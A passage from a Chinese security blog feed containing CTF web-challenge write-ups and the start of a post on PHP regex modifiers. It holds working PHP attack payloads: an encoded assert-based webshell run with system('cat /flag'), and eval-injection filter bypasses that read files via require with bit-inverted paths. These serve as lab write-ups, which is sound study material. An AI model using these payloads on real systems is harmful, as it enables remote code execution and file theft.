number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token comment">//</span></code></pre><p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p><h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'&#123;"secret"'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\"0-9A-Z]*&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">theFirstTimeSetCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_g_r</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token variable">$_m_u</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_h_p</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_m_u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$_g_r</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_h_p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_i</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;"secret":"'</span> <span class="token operator">.</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7200</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$obj</span> <span class="token operator">=</span> @<span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'give_me_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$flag_md5</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"here is your webshell: <span class="token interpolation"><span class="token variable">$shell_path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">die</span><span class="token punctuation">;</span></span></code></pre><p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p><p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p><p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret=&#123;&quot;secret&quot;:115&#125;</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//there are some secret waf that you will never know, fuzz me if you can</span><span class="token keyword">require</span> <span class="token string double-quoted-string">"hidden_filter.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>location.href=\'./index.php\'&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$secret_waf</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//清空session 从头再来</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$_SESSION["</span> <span class="token operator">.</span> <span class="token variable">$code</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"]=false;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! *  ————Deep CTF 2020*/</span></span></code></pre><p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li><li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li><li>使用<code>require</code>可以不需要括号</li><li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li></ul><p>得到<code>flag.txt</code>内容：</p><pre class="language-none"><code class="language-none">可以，说明你ctfshow的红包2没白做，flag在&#x2F;flag，同样的方法去读取吧。1]&#x3D;false;</code></pre><p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“温故而知新，可以为师矣”——孔子《论语》&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php正则表达式(PCRE)模式修饰符</title>
    <link href="https://www.extrader.top/posts/57833c1a/"/>
    <id>https://www.extrader.top/posts/57833c1a/</id>
    <published>2020-05-19T10:24:20.000Z</published>
    <updated>2020-07-14T12:46:48.344Z</updated>
    
    <content type="html"><![CDATA[<p>php单双引号的区别：</p><p>单引号：php不会读取里面的变量，作为纯字符串处理</p><p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p><p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html">详见</a></p><span id="more"></span><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>使得模式大小写不敏感</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>使得模式匹配上任意行之后就返回true</p><p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>使得<code>.</code>可以匹配换行符</p><p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>使得<code>$</code>不匹配换行符</p><p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>使得可以在模式中添加注释</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p><p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img 